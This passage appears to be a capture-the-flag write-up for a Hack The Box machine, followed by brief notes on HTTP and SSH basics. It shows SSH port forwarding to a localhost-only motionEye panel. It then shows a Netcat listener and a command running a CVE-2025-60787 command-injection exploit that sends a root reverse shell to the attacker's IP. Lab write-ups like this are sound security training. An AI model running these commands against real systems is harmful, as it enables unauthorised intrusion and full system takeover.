I noticed that the motionEye web interface was configured to listen only on the local interface (127.0.0.1), meaning I couldn't access it directly from my Kali browser.

The Strategy: I used SSH Local Port Forwarding to create an encrypted tunnel.

The Action: From my Kali machine, I ran a command to map my local port 8765 to the server's internal port 8765.
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb

The Result: This allowed me to "teleport" my browser traffic through SSH. I opened http://127.0.0.1:8765 on my Kali machine and was greeted by the motionEye login page, where I logged in as admin.

4. Privilege Escalation: Getting Root (CVE-2025-60787)
Once inside the motionEye admin panel, I looked for a way to execute system commands. I used a Python exploit script for CVE-2025-60787, which takes advantage of a command injection vulnerability in the service.

The Setup: I opened a new terminal and set up a Netcat listener to catch the incoming connection.
nc -lvnp 4444

The Exploit: I executed the Python script, pointing it at my tunnelled web interface and providing the admin credentials I had cracked. I included my VPN IP so the server knew where to send the shell.
python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '[PASS]' -i 10.10.14.56 --port 4444

The Final Move: Because the motionEye service was running with root privileges, the reverse shell it sent back to my Netcat listener gave me full root access.


HYPERTEXT PROTOCOL (HTTP,PORT 80)
HTTP is the protocol used to load websites.
Your browser sends a request to:
       IP of the server
       Port 80
Not encrypted 
Data is sent in plain text
Vulnerable to attacks (MITM, sniffing)

SECURE SHELL(SSH PORT 22)
SSH lets you securely connect to another computer remotely.
  ssh user@192.168.1.10
Encrypted communication 
Used by:
System admins
Hackers / pentesters
Gives command-line access to another machine
